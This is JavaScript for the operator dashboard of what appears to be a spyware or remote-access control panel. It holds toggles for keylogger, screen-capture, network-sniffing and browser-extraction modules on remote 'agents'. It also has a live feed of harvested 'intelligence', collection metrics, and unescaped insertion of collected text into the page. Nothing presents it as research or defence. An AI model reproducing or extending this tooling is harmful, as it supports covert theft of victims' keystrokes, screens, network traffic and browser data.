/**
 * Intelligence page functionality
 */

class IntelligenceManager {
    constructor(app) {
        this.app = app;
        this.intelligenceData = [];
        this.filters = {
            dataType: 'ALL',
            agent: 'ALL',
            search: ''
        };
        
        this.initializeIntelligence();
    }
    
    initializeIntelligence() {
        this.setupEventListeners();
        this.loadIntelligenceData();
        this.loadCollectionMetrics();
        this.startRealTimeUpdates();
    }
    
    setupEventListeners() {
        // Module toggles
        document.getElementById('keyloggerToggle')?.addEventListener('change', (e) => {
            this.toggleCollectionModule('keylogger', e.target.checked);
        });
        
        document.getElementById('screencapToggle')?.addEventListener('change', (e) => {
            this.toggleCollectionModule('screencap', e.target.checked);
        });
        
        document.getElementById('networksniffToggle')?.addEventListener('change', (e) => {
            this.toggleCollectionModule('networksniff', e.target.checked);
        });
        
        document.getElementById('browserextractToggle')?.addEventListener('change', (e) => {
            this.toggleCollectionModule('browserextract', e.target.checked);
        });
        
        // Filter changes
        document.getElementById('dataTypeFilter')?.addEventListener('change', (e) => {
            this.filters.dataType = e.target.value;
            this.filterIntelligenceData();
        });
        
        document.getElementById('agentFilter')?.addEventListener('change', (e) => {
            this.filters.agent = e.target.value;
            this.filterIntelligenceData();
        });
    }
    
    async loadIntelligenceData() {
        try {
            const intelligence = await this.app.makeApiRequest('/intelligence/recent');
            this.intelligenceData = intelligence.entries || [];
            this.updateIntelligenceDisplay();
            this.updateAgentFilter();
        } catch (error) {
            console.error('Failed to load intelligence data:', error);
        }
    }
    
    async loadCollectionMetrics() {
        try {
            const metrics = await this.app.makeApiRequest('/intelligence/metrics');
            this.updateMetricsDisplay(metrics);
        } catch (error) {
            console.error('Failed to load collection metrics:', error);
        }
    }
    
    updateIntelligenceDisplay() {
        const intelligenceList = document.getElementById('intelligenceList');
        if (!intelligenceList) return;
        
        const filteredData = this.getFilteredIntelligence();
        
        intelligenceList.innerHTML = filteredData.map(item => `
            <div class="intelligence-item" onclick="showIntelligenceDetail('${item.id}')">
                <div class="intelligence-header">
                    <span class="intelligence-type">${item.data_type}</span>
                    <span class="intelligence-agent">${item.agent_id ? this.app.maskAgentId(item.agent_id) : 'SYSTEM'}</span>
                </div>
                <div class="intelligence-timestamp">${this.app.formatTimestamp(item.timestamp)}</div>
                <div class="intelligence-preview">${this.truncatePreview(item.preview)}</div>
            </div>
        `).join('');
    }
    
    getFilteredIntelligence() {
        return this.intelligenceData.filter(item => {
            // Data type filter
            if (this.filters.dataType !== 'ALL' && item.data_type !== this.filters.dataType) {
                return false;
            }
            
            // Agent filter
            if (this.filters.agent !== 'ALL' && item.agent_id !== this.filters.agent) {
                return false;
            }
            
            // Search filter
            if (this.filters.search) {
                const searchTerm = this.filters.search.toLowerCase();
                const searchableText = `${item.data_type} ${item.preview} ${item.agent_id}`.toLowerCase();
                if (!searchableText.includes(searchTerm)) {
                    return false;
                }
            }
            
            return true;
        });
    }
    
    updateAgentFilter() {
        const agentFilter = document.getElementById('agentFilter');
        if (!agentFilter) return;
        
        // Get unique agents from intelligence data
        const agents = [...new Set(this.intelligenceData.map(item => item.agent_id).filter(Boolean))];
        
        // Clear existing options except "ALL"
        while (agentFilter.children.length > 1) {
            agentFilter.removeChild(agentFilter.lastChild);
        }
        
        // Add agent options
        agents.forEach(agentId => {
            const option = document.createElement('option');
            option.value = agentId;
            option.textContent = this.app.maskAgentId(agentId);
            agentFilter.appendChild(option);
        });
    }
    
    updateMetricsDisplay(metrics) {
        document.getElementById('totalDataCollected').textContent = this.app.formatBytes(metrics.total_data);
        document.getElementById('activeCollections').textContent = metrics.active_collections;
        document.getElementById('successRate').textContent = metrics.success_rate + '%';
        document.getElementById('dataThroughput').textContent = this.app.formatBytes(metrics.throughput) + '/s';
    }
    
    async toggleCollectionModule(module, enabled) {
        try {
            await this.app.makeApiRequest('/intelligence/modules/toggle', {
                method: 'POST',
                body: { module, enabled }
            });
            
            this.app.showNotification(`${module} ${enabled ? 'enabled' : 'disabled'}`, 'info');
        } catch (error) {
            console.error(`Failed to toggle ${module}:`, error);
            this.app.showNotification(`Failed to toggle ${module}`, 'error');
            
            // Revert toggle state
            const toggle = document.getElementById(`${module}Toggle`);
            if (toggle) {
                toggle.checked = !enabled;
            }
        }
    }
    
    startRealTimeUpdates() {
        // WebSocket for real-time intelligence updates
        this.setupIntelligenceWebSocket();
        
        // Periodic refresh
        setInterval(() => {
            this.loadIntelligenceData();
            this.loadCollectionMetrics();
        }, 10000); // Refresh every 10 seconds
    }
    
    setupIntelligenceWebSocket() {
        try {
            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${wsProtocol}//${window.location.host}/ws/intelligence`;
            
            this.intelligenceWebSocket = new WebSocket(wsUrl);
            
            this.intelligenceWebSocket.onopen = () => {
                console.log('Intelligence WebSocket connected');
            };
            
            this.intelligenceWebSocket.onmessage = (event) => {
                const data = JSON.parse(event.data);
                this.handleRealtimeIntelligence(data);
            };
            
            this.intelligenceWebSocket.onclose = () => {
                console.log('Intelligence WebSocket disconnected');
                setTimeout(() => this.setupIntelligenceWebSocket(), 5000);
            };
            
        } catch (error) {
            console.error('Intelligence WebSocket connection failed:', error);
        }
    }
    
    handleRealtimeIntelligence(data) {
        switch (data.type) {
            case 'NEW_INTELLIGENCE':
                this.addNewIntelligence(data.payload);
                break;
            case 'MODULE_STATUS':
                this.updateModuleStatus(data.payload);
                break;
            case 'METRICS_UPDATE':
                this.updateMetricsDisplay(data.payload);
                break;
        }
    }
    
    addNewIntelligence(intelItem) {
        // Add to beginning of array
        this.intelligenceData.unshift(intelItem);
        
        // Update display
        this.updateIntelligenceDisplay();
        
        // Show notification for high-priority items
        if (intelItem.priority === 'HIGH') {
            this.app.showNotification(`New high-priority intelligence: ${intelItem.data_type}`, 'warning');
        }
    }
    
    updateModuleStatus(moduleStatus) {
        const toggle = document.getElementById(`${moduleStatus.module}Toggle`);
        if (toggle) {
            toggle.checked = moduleStatus.enabled;
        }
    }
    
    truncatePreview(text, length = 150) {
        if (text.length <= length) return text;
        return text.substring(0, length) + '...';
    }
    
    filterIntelligenceData() {
        this.updateIntelligenceDisplay();
    }
    
    searchIntelligence() {
        const searchInput = document.getElementById('intelligenceSearch');
        if (searchInput) {
            this.filters.search = searchInput.value;
            this.filterIntelligenceData();
        }
    }
}

// Global intelligence functions
function refreshIntelligenceData() {
    if (window.intelligenceManager) {
        window.intelligenceManager.loadIntelligenceData();
        window.intelligenceManager.loadCollectionMetrics();
        window.app.showNotification('Intelligence data refreshed', 'info');
    }
}

function filterIntelligenceData() {
    if (window.intelligenceManager) {
        window.intelligenceManager.filterIntelligenceData();
    }
}

function searchIntelligence() {
    if (window.intelligenceManager) {
        window.intelligenceManager.searchIntelligence();
    }
}

function configureKeylogger() {
    // Implementation for keylogger configuration modal
    window.app.showNotification('Opening keylogger configuration', 'info');
}

function configureScreencap() {
    window.app.showNotification('Opening screen capture configuration', 'info');
}

function configureNetworksniff() {
    window.app.showNotification('Opening network sniffing configuration', 'info');
}

function configureBrowserextract() {
    window.app.showNotification('Opening browser extraction configuration', 'info');
}

function showIntelligenceDetail(intelId) {
    // Implementation for intelligence detail modal
    window.app.showNotification(`Showing details for intelligence item: ${intelId}`, 'info');
}

// Initialize intelligence manager when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    if (typeof app !== 'undefined') {
        window.intelligenceManager = new IntelligenceManager(app);
    }
});
